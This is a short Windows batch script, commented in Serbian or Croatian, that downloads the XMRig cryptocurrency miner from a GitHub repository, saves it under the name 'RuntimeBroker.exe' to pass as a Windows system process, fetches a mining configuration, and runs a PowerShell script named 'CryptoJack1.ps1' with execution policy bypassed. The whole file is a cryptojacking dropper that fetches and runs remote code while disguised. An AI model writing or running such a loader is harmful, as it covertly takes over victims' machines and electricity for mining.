@echo off
:: Preuzimanje rudara i konfiguracije sa tvog GitHub-a
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/Djokaj100/test-miner-projekt/raw/refs/heads/main/xmrig.exe', '%~dp0RuntimeBroker.exe')"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Djokaj100/test-miner-projekt/refs/heads/main/config.json', '%~dp0config.json')"

:: Pokretanje PowerShell skripte za instalaciju/izvrsavanje
powershell -ExecutionPolicy Bypass -File "%~dp0CryptoJack1.ps1"
